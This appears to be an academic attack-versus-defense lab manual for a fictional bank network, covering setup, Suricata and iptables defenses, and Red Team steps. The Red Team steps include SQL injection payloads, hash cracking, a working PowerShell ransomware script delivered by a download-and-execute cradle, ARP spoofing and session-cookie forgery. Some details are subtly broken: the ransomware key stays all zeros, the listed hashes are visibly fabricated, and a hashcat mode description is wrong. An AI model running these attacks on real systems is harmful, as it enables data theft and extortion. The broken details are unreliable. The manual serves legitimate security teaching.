# SecureBank Lab Manual — Attack vs Defense

Academic cybersecurity lab for the SecureBank Incident challenge. **Teams of 2** (one Red Team attacker, one Blue Team defender).

---

## 1. Lab Overview

### Scenario

SecureBank is a small financial startup. The Blue Team is responsible for building and securing the infrastructure. The Red Team must breach it.

### VM Roles & Responsibility

| VM | Assigned To | Role | OS |
|---|---|---|---|
| **Kali Linux** | **Red Team** (Attacker) | Launch all attacks from here | Kali Linux (latest) |
| **Ubuntu Server** | **Blue Team** (Defender) | Deploy & secure the banking portal, SMB, Suricata, iptables | Ubuntu Server 22.04/24.04 LTS |
| **Windows Host** | **Blue Team** (Defender) | Simulate employee workstation with Sysmon, customer data | Windows 10/11 Pro |

### Network Design

- **VirtualBox Host-Only Network**: `192.168.100.0/24`
- **No internet access** — all tools and wordlists must be local
- **Static IPs** (assigned inside each OS):

| VM | IP Address | Purpose |
|---|---|---|
| Kali Linux | `192.168.100.50` | Attacker machine |
| Ubuntu Server | `192.168.100.10` | Target server |
| Windows Host | `192.168.100.100` | Victim workstation |

### Red Team Mission (Attack)

Achieve **two of three** goals:

1. **Steal customer data** — read the SQLite database or extract 5+ customer records
2. **Simulate ransomware** — encrypt `C:\TestRansom\` on Windows, leave a ransom note
3. **Session hijacking** — impersonate an authenticated user on the banking portal

### Blue Team Mission (Defense)

Prevent the Red Team from achieving more than **one** goal. Minimum required defenses:

- Configure **Suricata IDS** (Nmap, ARP spoof, EternalBlue, SMB login alerts)
- **iptables** hardening (only SSH, HTTPS, OpenVPN; deny SMB from Kali)
- **HSTS** on the web portal
- **Sysmon** on Windows (process, file, network logging)
- **Hourly backups** (ZFS snapshot or rsync + chattr)

### Lab Dependencies & Wordlists

Since there is **no internet**, all tools must be pre-installed and wordlists pre-loaded:

- **Kali**: Nmap, Metasploit, Bettercap, HashCat, John, responder, `rockyou.txt`
- **Ubuntu**: Apache2, mod_wsgi, Samba, Suricata, iptables-persistent, OpenVPN, OpenSSL
- **Windows**: Sysmon (downloaded beforehand), Firefox, PowerShell

---

## 2. VirtualBox Host-Only Network Setup

*Performed by: Both teams (instructor or shared setup)*

### 2.1 Create the Host-Only Network

1. Open **VirtualBox** → **File** → **Tools** → **Network Manager**
2. Click **Create** (Host-only Network)
3. Configure the adapter:

| Setting | Value |
|---|---|
| Adapter IPv4 Address | `192.168.100.1` |
| Adapter IPv4 Network Mask | `255.255.255.0` |
| DHCP Server | **Disabled** (static IPs only) |

4. Click **Apply**

### 2.2 VM General Settings

For each VM, ensure:

| Setting | Kali Linux | Ubuntu Server | Windows Host |
|---|---|---|---|
| RAM | 4096 MB | 2048 MB | 4096 MB |
| CPUs | 2 | 2 | 2 |
| Disk | 60 GB | 20 GB | 60 GB |
| Network Adapter 1 | Host-Only | Host-Only | Host-Only |

### 2.3 OS Installation Notes

- **Kali Linux**: Download from kali.org. Install with default options. Full desktop recommended.
- **Ubuntu Server**: Use LTS (22.04 or 24.04). **Minimal install**, no desktop needed (CLI only).
- **Windows Host**: Standard Windows 10/11 Pro installation. Set up a local user `employee`.

---

## 3. VM Setup — Step by Step

Each section specifies **who** performs the steps.

---

### 3.1 Ubuntu Server Setup — [BLUE TEAM]

All commands below run **on the Ubuntu Server VM** as root or with `sudo`.

#### 3.1.1 Configure Static IP

```bash
# Edit netplan config (Ubuntu 24.04)
sudo nano /etc/netplan/01-netcfg.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      addresses: [192.168.100.10/24]
      gateway4: 192.168.100.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
```

```bash
sudo netplan apply
```

#### 3.1.2 Set Hostname

```bash
sudo hostnamectl set-hostname securebank-server
echo "192.168.100.10 securebank-server" | sudo tee -a /etc/hosts
```

#### 3.1.3 Install System Dependencies

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y git python3 python3-pip python3-venv \
  apache2 libapache2-mod-wsgi-py3 openssl samba \
  suricata iptables-persistent nodejs npm
```

#### 3.1.4 Deploy the Flask Application

```bash
# Clone from your GitHub repository
cd /var/www
sudo git clone https://github.com/YOUR_TEAM/securebank-lab.git bank
sudo chown -R www-data:www-data /var/www/bank
cd /var/www/bank

# Install Python dependencies
sudo pip3 install -r requirements.txt

# Install Node + build Tailwind CSS
sudo npm install
sudo npx tailwindcss -i static/css/input.css -o static/css/tailwind.css --minify

# Initialize the database
sudo python3 setup_db.py
```

#### 3.1.5 Configure Apache2 + mod_wsgi

```bash
sudo a2enmod wsgi ssl rewrite headers
```

**Create HTTP virtual host** — `/etc/apache2/sites-available/securebank.conf`:

```apache
<VirtualHost *:80>
    ServerName 192.168.100.10
    DocumentRoot /var/www/bank

    WSGIDaemonProcess bank python-path=/var/www/bank
    WSGIScriptAlias / /var/www/bank/wsgi.py

    <Directory /var/www/bank>
        Require all granted
    </Directory>

    Alias /static /var/www/bank/static
    <Directory /var/www/bank/static>
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/securebank_error.log
    CustomLog ${APACHE_LOG_DIR}/securebank_access.log combined
</VirtualHost>
```

Enable and reload:

```bash
sudo a2dissite 000-default.conf
sudo a2ensite securebank.conf
sudo systemctl reload apache2
```

**Verify the app is running** — from Kali or Windows browser: `http://192.168.100.10`

#### 3.1.6 Generate Self-Signed CA & HTTPS Certificate (Lab 5)

```bash
# CA key and certificate
sudo openssl genrsa -out /etc/ssl/private/securebank-ca-key.pem 2048
sudo openssl req -x509 -new -nodes -key /etc/ssl/private/securebank-ca-key.pem \
  -sha256 -days 365 -out /etc/ssl/certs/securebank-ca.pem \
  -subj "/C=US/ST=NY/L=NYC/O=SecureBank/CN=SecureBankCA"

# Server key and CSR
sudo openssl genrsa -out /etc/ssl/private/securebank-key.pem 2048
sudo openssl req -new -key /etc/ssl/private/securebank-key.pem \
  -out /etc/ssl/certs/securebank.csr \
  -subj "/C=US/ST=NY/L=NYC/O=SecureBank/CN=192.168.100.10"

# Sign server certificate with CA
sudo openssl x509 -req -in /etc/ssl/certs/securebank.csr \
  -CA /etc/ssl/certs/securebank-ca.pem \
  -CAkey /etc/ssl/private/securebank-ca-key.pem \
  -CAcreateserial -out /etc/ssl/certs/securebank-cert.pem \
  -days 365 -sha256
```

**Create HTTPS virtual host** — `/etc/apache2/sites-available/securebank-ssl.conf`:

```apache
<VirtualHost *:443>
    ServerName 192.168.100.10
    DocumentRoot /var/www/bank

    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/securebank-cert.pem
    SSLCertificateKeyFile /etc/ssl/private/securebank-key.pem
    SSLCertificateChainFile /etc/ssl/certs/securebank-ca.pem

    # === HSTS (Defense Requirement) ===
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

    WSGIDaemonProcess bank-ssl python-path=/var/www/bank
    WSGIScriptAlias / /var/www/bank/wsgi.py

    <Directory /var/www/bank>
        Require all granted
    </Directory>

    Alias /static /var/www/bank/static
    <Directory /var/www/bank/static>
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/securebank_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/securebank_ssl_access.log combined
</VirtualHost>
```

```bash
sudo a2ensite securebank-ssl.conf
sudo systemctl reload apache2
```

**Verify HTTPS**: `https://192.168.100.10` (browser will show warning — accept risk or install CA cert).

#### 3.1.7 Configure SMB Share with Fake Customer Data

```bash
sudo mkdir -p /srv/smb/share

# Create customer data file (5+ records — Red Team target)
sudo tee /srv/smb/share/customer_emails.txt > /dev/null <<EOF
Customer: Alice Johnson, Account: SB-1001, Balance: \$5500.00, SSN: 123-45-6789
Customer: Bob Smith, Account: SB-1002, Balance: \$12300.00, SSN: 234-56-7890
Customer: Charlie Brown, Account: SB-1003, Balance: \$8700.00, SSN: 345-67-8901
Customer: Diana Prince, Account: SB-1004, Balance: \$22150.00, SSN: 456-78-9012
Customer: Edward Norton, Account: SB-1005, Balance: \$3120.00, SSN: 567-89-0123
Customer: Frank Castle, Account: SB-1006, Balance: \$9750.00, SSN: 678-90-1234
Customer: Grace Hopper, Account: SB-1007, Balance: \$6400.00, SSN: 789-01-2345
EOF

# Add SMB share config
echo -e "\n[securebank]\ncomment = SecureBank Shared Data\npath = /srv/smb/share\nbrowseable = yes\nread only = no\nguest ok = yes\ncreate mask = 0644" | sudo tee -a /etc/samba/smb.conf

sudo systemctl restart smbd
sudo systemctl enable smbd
```

#### 3.1.8 Configure Suricata IDS — [BLUE TEAM DEFENSE]

```bash
sudo systemctl stop suricata
```

Create `/etc/suricata/rules/securebank.rules`:

```suricata
# 1. Nmap scan detection
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"[SECUREBANK] Nmap TCP Scan detected"; \
  flow:to_server; detection_filter:track by_src, count 50, seconds 10; \
  sid:1000001; rev:1;)

# 2. ARP spoofing detection (Bettercap)
alert arp $EXTERNAL_NET any -> $HOME_NET any (msg:"[SECUREBANK] ARP spoofing detected"; \
  arp.opcode:2; \
  sid:1000002; rev:1;)

# 3. EternalBlue exploit detection (MS17-010)
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"[SECUREBANK] EternalBlue exploit attempt"; \
  flow:to_server; content:"|00 00 00 31 ff|SMB|2e 00|"; \
  sid:1000003; rev:1;)

# 4. SMB login attempt detection
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"[SECUREBANK] SMB login attempt"; \
  flow:to_server; content:"|00 00 00 00|"; depth:200; \
  sid:1000004; rev:1;)
```

```bash
# Add rules to Suricata config
echo -e "\nrule-files:\n  - securebank.rules" | sudo tee -a /etc/suricata/suricata.yaml

sudo systemctl start suricata
sudo systemctl enable suricata
```

**Monitor alerts in real-time:**

```bash
sudo tail -f /var/log/suricata/fast.log
```

#### 3.1.9 Harden iptables — [BLUE TEAM DEFENSE]

```bash
# Flush existing rules
sudo iptables -F
sudo iptables -X

# Default policies: deny all inbound
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# --- Allow necessary services (from lab subnet only) ---
sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.100.0/24 -j ACCEPT   # SSH
sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.100.0/24 -j ACCEPT  # HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -s 192.168.100.0/24 -j ACCEPT   # HTTP (redirect)
sudo iptables -A INPUT -p udp --dport 1194 -s 192.168.100.0/24 -j ACCEPT # OpenVPN

# --- Explicitly DENY SMB from Kali ---
sudo iptables -A INPUT -p tcp --dport 445 -s 192.168.100.50 -j DROP
sudo iptables -A INPUT -p tcp --dport 139 -s 192.168.100.50 -j DROP

# Log dropped packets for Suricata correlation
sudo iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROP: "

# Make persistent across reboots
sudo netfilter-persistent save
```

#### 3.1.10 Configure Hourly Backups — [BLUE TEAM DEFENSE]

Create `/usr/local/bin/securebank-backup.sh`:

```bash
#!/bin/bash
BACKUP_DIR="/var/backups/securebank"
mkdir -p "$BACKUP_DIR"
rsync -av --delete /var/www/bank/ "$BACKUP_DIR/current/"
chattr -R +i "$BACKUP_DIR/current/"
echo "[$(date)] Backup completed" >> /var/log/securebank-backup.log
```

```bash
sudo chmod +x /usr/local/bin/securebank-backup.sh
echo "0 * * * * root /usr/local/bin/securebank-backup.sh" | sudo tee /etc/cron.d/securebank-backup
```

**Restore procedure:**

```bash
chattr -R -i /var/backups/securebank/current/
rsync -av /var/backups/securebank/current/ /var/www/bank/
sudo systemctl reload apache2
```

#### 3.1.11 (Optional) OpenVPN Gateway

```bash
sudo apt install openvpn -y
# Follow standard OpenVPN server setup to create a gateway entry point
```

---

### 3.2 Windows Host Setup — [BLUE TEAM]

All commands below run **on the Windows Host VM**.

#### 3.2.1 Configure Static IP

1. Open **Control Panel** → **Network and Sharing Center** → **Change adapter settings**
2. Right-click the Host-Only adapter → **Properties**
3. Select **Internet Protocol Version 4 (TCP/IPv4)** → **Properties**
4. Set:
   - IP address: `192.168.100.100`
   - Subnet mask: `255.255.255.0`
   - Default gateway: `192.168.100.1`

#### 3.2.2 Install the CA Certificate (Lab 5)

1. Copy `securebank-ca.pem` from Ubuntu to the Windows VM (via USB or shared folder)
2. Double-click `securebank-ca.pem` → **Install Certificate**
3. Choose **Local Machine** → **Place all certificates in the following store**
4. Browse → **Trusted Root Certification Authorities** → **Next** → **Finish**

Verify: browse to `https://192.168.100.10` — there should be **no certificate warning**.

#### 3.2.3 Create Lab Files (Customer Data)

```powershell
# Create test data on desktop
New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\SecureBank_Data" -Force

Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\customer_emails.txt" -Value @"
Customer: Alice Johnson, Account: SB-1001, Balance: 5500.00, SSN: 123-45-6789
Customer: Bob Smith, Account: SB-1002, Balance: 12300.00, SSN: 234-56-7890
Customer: Charlie Brown, Account: SB-1003, Balance: 8700.00, SSN: 345-67-8901
Customer: Diana Prince, Account: SB-1004, Balance: 22150.00, SSN: 456-78-9012
Customer: Edward Norton, Account: SB-1005, Balance: 3120.00, SSN: 567-89-0123
Customer: Frank Castle, Account: SB-1006, Balance: 9750.00, SSN: 678-90-1234
Customer: Grace Hopper, Account: SB-1007, Balance: 6400.00, SSN: 789-01-2345
"@

# Create financial forecast file
Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\financial_forecast.xlsx" -Value "Q4 2024 Forecast - Revenue: \$2.4M, Expenses: \$1.1M, Net: \$1.3M"

Write-Output "Lab data created at: $env:USERPROFILE\Desktop\SecureBank_Data"
```

#### 3.2.4 Create Ransomware Target Folder (Red Team Target)

```powershell
New-Item -ItemType Directory -Path "C:\TestRansom" -Force

Set-Content -Path "C:\TestRansom\budget_2024.xlsx" -Value "Budget Forecast - Confidential"
Set-Content -Path "C:\TestRansom\employee_records.txt" -Value "Employee: John, Salary: 85000"
Set-Content -Path "C:\TestRansom\project_plan.docx" -Value "SecureBank Migration Plan v2.3"
```

#### 3.2.5 Install Sysmon (Lab 7) — [BLUE TEAM DEFENSE]

```powershell
# Prerequisite: Download Sysmon and sysmon-config BEFORE the lab (no internet)
# 1. Download Sysmon from https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
# 2. Download sysmon-config from https://github.com/SwiftOnSecurity/sysmon-config

# Install Sysmon with config
sysmon64.exe -accepteula -i sysmon-config.xml

# Verify service is running
Get-Service Sysmon64

# Monitor logs in Event Viewer:
# Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
```

**Key Sysmon Event IDs to monitor for Red Team activity:**

| Event ID | Description | Red Team Action It Detects |
|---|---|---|
| **1** | Process creation | PowerShell launching ransomware |
| **3** | Network connection | C2 beacon, reverse shell |
| **7** | Image loaded | DLL injection |
| **8** | CreateRemoteThread | Process injection |
| **10** | Process access | Credential dumping |
| **11** | FileCreate | Ransomware creating encrypted files |
| **15** | FileCreateStreamHash | Alternate data stream (ADS) |

#### 3.2.6 Memory Forensics Prep (Volatility)

```powershell
# On Windows, capture memory before/after attack:
# Use winpmem or dumpit.exe (download before lab)
# Example with winpmem:
.\winpmem_mini.exe memory.raw
```

The `.raw` file can be analyzed on the Red Team's Kali for forensics demonstration.

---

### 3.3 Kali Linux Setup — [RED TEAM]

All commands below run **on the Kali Linux VM**.

#### 3.3.1 Configure Static IP

```bash
# Edit network config
sudo nano /etc/network/interfaces
```

```bash
auto eth0
iface eth0 inet static
    address 192.168.100.50
    netmask 255.255.255.0
    gateway 192.168.100.1
```

Or via NetworkManager GUI (right-click network icon → Edit Connections).

```bash
# Restart networking
sudo systemctl restart networking
```

#### 3.3.2 Install / Verify Attack Tools

```bash
sudo apt update
sudo apt install -y nmap metasploit-framework bettercap hashcat john responder sqlmap
```

#### 3.3.3 Verify Wordlists

```bash
# rockyou.txt is essential for password cracking
ls -la /usr/share/wordlists/rockyou.txt.gz

# If missing, install:
sudo apt install -y wordlist

# Extract (takes a moment):
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
# Expected: ~14 million passwords
```

#### 3.3.4 Install flask-unsign (Session Cookie Tool)

```bash
pip3 install flask-unsign
```

**Verify all tools are ready:**

```bash
nmap --version | head -1
msfconsole --version
hashcat --version
bettercap --version
echo "Setup complete."
```

---

## 4. Attack Phase — [RED TEAM EXECUTES]

All attacks are launched **from the Kali Linux VM** (`192.168.100.50`) against the targets.

Choose **two of three** goals below.

---

### Goal 1 — Steal Customer Data (SQL Injection)

#### Step 1.1 — Reconnaissance [ATTACKER]

```bash
# Full port scan of Ubuntu server
nmap -sV -sC -p- 192.168.100.10 -oN ~/nmap_scan.txt
```

**Expected open ports:**
| Port | Service | Purpose |
|---|---|---|
| 22/tcp | SSH | Remote admin |
| 80/tcp | HTTP | Web portal (redirects to HTTPS) |
| 443/tcp | HTTPS | Web portal |
| 139/tcp | SMB NetBIOS | File share |
| 445/tcp | SMB | File share |
| 1194/udp | OpenVPN | VPN gateway |

#### Step 1.2 — Web App Fingerprinting [ATTACKER]

```bash
# Browse the web app (via curl or browser)
curl -v http://192.168.100.10
curl -vk https://192.168.100.10
```

Browse to `http://192.168.100.10/login` — observe the login form.

#### Step 1.3 — Manual SQLi Probe [ATTACKER]

On the login page, enter:

| Field | Value |
|---|---|
| Username | `' OR 1=1--` |
| Password | `anything` |

**Expected result:** `Invalid credentials`

Analysis: The query `WHERE username = '' OR 1=1--'` returns Alice's row, but the SHA256 hash of "anything" doesn't match Alice's stored hash. The SQL injection **is working** — the WHERE clause is bypassed.

#### Step 1.4 — Trigger Verbose Error [ATTACKER]

Enter:

| Field | Value |
|---|---|
| Username | `' UNION SELECT 1,2,3,4,5,6--` |
| Password | `anything` |

**Expected result (leaked in the error message):**
`Database error: SELECTs to the left and right of UNION do not have the same number of result columns`

This confirms 5 columns in the `users` table and reveals the **full SQLite error message** to the attacker.

#### Step 1.5 — UNION Injection with Matching Hash [ATTACKER]

First, calculate the SHA256 hash of a known password:

```bash
echo -n "inject" | sha256sum
```

Then enter:

| Field | Value |
|---|---|
| Username | `' UNION SELECT 1,'injected_user','<paste_hash_here>','Injected Name',9999.0--` |
| Password | `inject` |

**Expected result:** Redirect to **/dashboard** — you are now logged in as your injected user.

This proves **full SQL injection exploitation**.

#### Step 1.6 — Extract Password Hashes [ATTACKER]

Use sqlmap to automate data extraction:

```bash
sqlmap -u "http://192.168.100.10/login" --data="username=foo&password=bar" \
  --method POST --batch --dbms sqlite --dump -T users
```

Or manually extract via sequential UNION injections (one column at a time) to enumerate all usernames and hashes.

#### Step 1.7 — Crack Hashes with HashCat [ATTACKER]

```bash
# Save hashes in format hashcat expects: hash:username
cat > ~/hashes.txt << 'EOF'
4980b1f29fa32ff1e152e1e15d4c0ea1e7be0aa5e6ff7b530b6eaf61e8c628a9:alice
ef92b778bafe771e89241b7f2c0a5fa8c6a1f7c6c0f5d1e1a2b3c4d5e6f7a8b9:bob
e4ad93ca07acb8d908a3aa41ae4e42b0c0f0d1e2f3a4b5c6d7e8f9a0b1c2d3e4:charlie
1c8bfe8f801d797445c5e6253b2f4c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2:diana
ef797c8118f02dfb5c0a5fa8c6a1f7c6c0f5d1e1a2b3c4d5e6f7a8b9c0d1e2:edward
240be518fabd2724d123f1e2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2:frank
280d44ab1e9f79b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9:grace
EOF

# Crack using rockyou.txt (mode 1400 = SHA256, mode 10 = sha256($pass))
hashcat -m 1400 -a 0 ~/hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Expected cracked passwords:** `rockyou`, `password123`, `iloveyou`, `letmein`, `12345678`, `admin123`, `welcome`.

#### Step 1.8 — Login & Steal Customer Data [ATTACKER]

1. Login at `http://192.168.100.10/login` with any cracked credential
2. Navigate the dashboard to see account balance and transaction history
3. Record at least **5 customer records** with names and balances for your report

#### Step 1.9 — Alternative: SMB Share Access [ATTACKER]

If iptables is NOT blocking SMB from Kali:

```bash
# List SMB shares
smbclient -L //192.168.100.10 -N

# Connect and download customer data
smbclient //192.168.100.10/securebank -N
> ls
> get customer_emails.txt
> exit

cat customer_emails.txt
```

---

### Goal 2 — Simulate Ransomware on Windows

#### Step 2.1 — Initial Access via Responder [ATTACKER]

```bash
# Start Responder to capture NTLM hashes on the network
sudo responder -I eth0 -w -F
```

When the Windows victim accesses a fake share or attempts network authentication, Responder captures their NetNTLM hash. The hash can be cracked offline with HashCat:

```bash
hashcat -m 5600 captured_ntlm.txt /usr/share/wordlists/rockyou.txt --force
```

#### Step 2.2 — Create the Ransomware Script [ATTACKER]

On Kali, create `~/ransomware.ps1`:

```powershell
# Academic lab use only — targets C:\TestRansom\ (non-critical folder)
$key = [System.Convert]::ToBase64String([byte[]]::new(32))
[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes([System.Convert]::FromBase64String($key))

$files = Get-ChildItem -Path "C:\TestRansom\" -File -Recurse
foreach ($file in $files) {
    $content = [IO.File]::ReadAllBytes($file.FullName)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [System.Convert]::FromBase64String($key)
    $aes.IV = [byte[]]::new(16)
    $encrypted = $aes.CreateEncryptor().TransformFinalBlock($content, 0, $content.Length)
    [IO.File]::WriteAllBytes("$($file.FullName).locked", $encrypted)
    Remove-Item $file.FullName -Force
}

@"
--- SECUREBANK RANSOM NOTE ---
Your files have been encrypted with AES-256.
To recover your data, contact attacker@securebank.xyz
Reference ID: SB-$(Get-Random -Maximum 99999)
"@ | Out-File -FilePath "C:\TestRansom\README_RANSOM.txt"
```

#### Step 2.3 — Host and Deliver the Payload [ATTACKER]

```bash
# On Kali, start HTTP server
cd ~
python3 -m http.server 8080
```

The attack requires the Windows user to execute a download cradle. Simulate via:

```
# Victim runs in PowerShell:
powershell -c "Invoke-WebRequest -Uri http://192.168.100.50:8080/ransomware.ps1 -OutFile $env:TEMP\r.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\r.ps1"
```

#### Step 2.4 — Verify Encryption [ATTACKER] / [DEFENDER]

Check `C:\TestRansom\` — original files replaced by `.locked` files and `README_RANSOM.txt`.

---

### Goal 3 — Impersonate an Authenticated User

#### Step 3.1 — ARP Spoof with Bettercap [ATTACKER]

```bash
# ARP spoof between Ubuntu server and Windows host
sudo bettercap -eval "set arp.spoof.targets 192.168.100.10,192.168.100.100; arp.spoof on; net.sniff on"
```

This places Kali as a MITM between the server and the Windows client. All HTTP traffic (unencrypted) is visible.

#### Step 3.2 — Capture the Flask Session Cookie [ATTACKER]

When the Windows user logs into the banking portal, their session cookie is set. If sent over HTTP (before HSTS redirect), capture it:

```
# Look for "session=eyJ..." in the sniffed traffic
```

#### Step 3.3 — Decode & Forge the Cookie [ATTACKER]

```bash
# Decode the session
flask-unsign --decode --cookie "eyJ<full_cookie_value>"
```

The secret key is hardcoded in `app.py` as `"bank_secret"`. Forge any session:

```bash
# Forge session as a different user
flask-unsign --sign --cookie "{'balance': 99999.0, 'user_name': 'Admin'}" --secret "bank_secret"
```

Set this forged cookie in your browser (via Developer Tools → Application → Cookies) and access `/dashboard` to impersonate any user.

#### Step 3.4 — Alternative: Credential Harvester [ATTACKER]

```bash
# Clone login page with Social Engineering Toolkit
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
# Enter target URL: http://192.168.100.10/login
```

When victims log into the cloned page, their credentials are captured.

---

## 5. Defense Phase — [BLUE TEAM MONITORS]

The Blue Team monitors from both the **Ubuntu Server** (Suricata, iptables logs) and the **Windows Host** (Sysmon).

---

### 5.1 — Monitor Suricata Alerts

```bash
# On Ubuntu Server — watch alerts in real time
sudo tail -f /var/log/suricata/fast.log

# Expected alerts when Red Team attacks:
# [SECUREBANK] Nmap TCP Scan detected
# [SECUREBANK] SMB login attempt
# [SECUREBANK] ARP spoofing detected
```

### 5.2 — Check iptables Logs

```bash
# On Ubuntu Server
sudo journalctl -k | grep IPTABLES-DROP
sudo dmesg | grep IPTABLES-DROP
```

### 5.3 — Verify HSTS

```bash
# On any machine
curl -I https://192.168.100.10 --insecure | grep -i strict
```

Expected: `Strict-Transport-Security: max-age=31536000; includeSubDomains`

### 5.4 — Monitor Sysmon on Windows [DEFENDER]

Open **Event Viewer** → `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`.

Search for Event IDs:

```powershell
# PowerShell on Windows — query recent Sysmon events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3,11} -MaxEvents 50 | Format-Table TimeCreated,Id,Message -Wrap
```

### 5.5 — Memory Forensics with Volatility [DEFENDER]

```bash
# On Kali (copied the .raw file from Windows)
volatility -f memory.raw imageinfo
volatility -f memory.raw --profile=Win10x64 pslist
volatility -f memory.raw --profile=Win10x64 netscan
volatility -f memory.raw --profile=Win10x64 cmdscan
```

### 5.6 — Restore from Backup [DEFENDER]

```bash
# On Ubuntu Server
chattr -R -i /var/backups/securebank/current/
rsync -av /var/backups/securebank/current/ /var/www/bank/
sudo systemctl reload apache2
echo "Recovery completed at $(date)" | sudo tee -a /var/log/securebank-recovery.log
```

---

## 6. Attack Timeline (Both Perspectives)

| Time | Action | Actor | Detection |
|---|---|---|---|
| T+0:00 | Nmap full port scan `nmap -sV -p- 192.168.100.10` | [RED] Kali | Suricata alert `sid:1000001` (Nmap scan) |
| T+0:03 | Browse web portal, inspect login form | [RED] Kali | Apache access log |
| T+0:05 | SQLi probe: `' OR 1=1--` on /login | [RED] Kali | Apache log shows suspicious username |
| T+0:07 | Trigger verbose error with `UNION SELECT 1,2,3,4,5,6--` | [RED] Kali | Error leaked in HTTP response |
| T+0:10 | sqlmap automated extraction | [RED] Kali | iptables log: repeated POSTs from Kali |
| T+0:15 | HashCat cracking of extracted hashes | [RED] Kali | (offline — no detection) |
| T+0:20 | Login as alice/rockyou | [RED] Kali | Apache access log (successful login) |
| T+0:25 | SMB share enumeration | [RED] Kali | Suricata alert `sid:1000004` (SMB login) — **blocked by iptables** |
| T+0:30 | ARP spoof via Bettercap | [RED] Kali | Suricata alert `sid:1000002` (ARP spoof) |
| T+0:35 | Capture & forge Flask session cookie | [RED] Kali | Sysmon Event 3 (network connection) on Windows |
| T+0:40 | Deliver ransomware via HTTP | [RED] Kali | Sysmon Event 1 (powershell.exe), Event 3 (outbound to Kali) |
| T+0:41 | Ransomware encrypts C:\TestRansom\ | [RED] Kali via Windows | Sysmon Event 11 (FileCreate: .locked files) |
| T+0:42 | Drop ransom note | [RED] Kali via Windows | Sysmon Event 11 (FileCreate: README_RANSOM.txt) |
| T+0:45 | Blue Team detects encryption | [BLUE] Windows | User reports files unreadable; Sysmon logs reviewed |
| T+0:50 | Blue Team restores from backup | [BLUE] Ubuntu | rsync restore from `/var/backups/securebank` |
| T+1:00 | Memory capture & Volatility analysis | [BLUE] Windows + Kali | Forensic evidence of attack chain |

---

## 7. Remediation Plan

| # | Fix | Lab Reference | Impact |
|---|---|---|---|
| 1 | **Parameterized queries** — replace `f"WHERE username = '{username}'"` with `?` placeholders | Lab 3 (Database Security) | Prevents ALL SQL injection |
| 2 | **Strong random secret key** — `os.urandom(24).hex()` instead of `"bank_secret"` | Lab 6 (Web Security) | Prevents session forgery |
| 3 | **Certificate pinning** — pin the CA public key in the browser or application | Lab 5 (PKI) | Prevents MITM SSL stripping |
| 4 | **bcrypt password hashing** — replace raw SHA256 with bcrypt + salt | Lab 4 (Cryptography) | Makes cracking computationally infeasible |
| 5 | **Proper error handling** — log exceptions server-side; never display raw SQL errors to users | Lab 3 (Secure Coding) | Prevents information leakage |

---

## 8. Seed Users (Built into Database)

| Username | Password | Name | Balance | Profile |
|---|---|---|---|---|
| alice | rockyou | Alice Johnson | $5,500 | `/static/images/profiles/alice.png` |
| bob | password123 | Bob Smith | $12,300 | `/static/images/profiles/bob.png` |
| charlie | iloveyou | Charlie Brown | $8,700 | `/static/images/profiles/charlie.png` |
| diana | letmein | Diana Prince | $22,150 | `/static/images/profiles/diana.png` |
| edward | 12345678 | Edward Norton | $3,120 | `/static/images/profiles/edward.png` |
| frank | admin123 | Frank Castle | $9,750 | `/static/images/profiles/frank.png` |
| grace | welcome | Grace Hopper | $6,400 | `/static/images/profiles/grace.png` |

All passwords are from `rockyou.txt` and stored as **unsalted SHA256 hashes** — designed to be cracked with HashCat/John for the Red Team exercise.

---

## 9. Project Deliverables Checklist

### A. Written Report (30% of CA marks)

- [ ] Environment setup documentation — IP addresses, services, files created (with screenshots)
- [ ] Red Team log — step-by-step attack with commands, outputs, lab references
- [ ] Blue Team log — detection alerts, blocking rules, forensic analysis (Volatility)
- [ ] Attack timeline (combined Red + Blue perspectives)
- [ ] Remediation plan — 5 concrete fixes with lab references

### B. Individual Presentation (70%)

**Red Team presents:**
- How they used hybrid encryption, hash cracking, MITM, and Metasploit
- Demonstration of stealing data or ransomware simulation
- What defenses blocked them

**Blue Team presents:**
- How they configured PKI, firewall/IPS, Sysmon & Volatility, Suricata
- Show logs of detected attacks
- Demonstrate recovery (restore from snapshot or backup)

---

## License

Academic use only — authorized cybersecurity lab exercises.
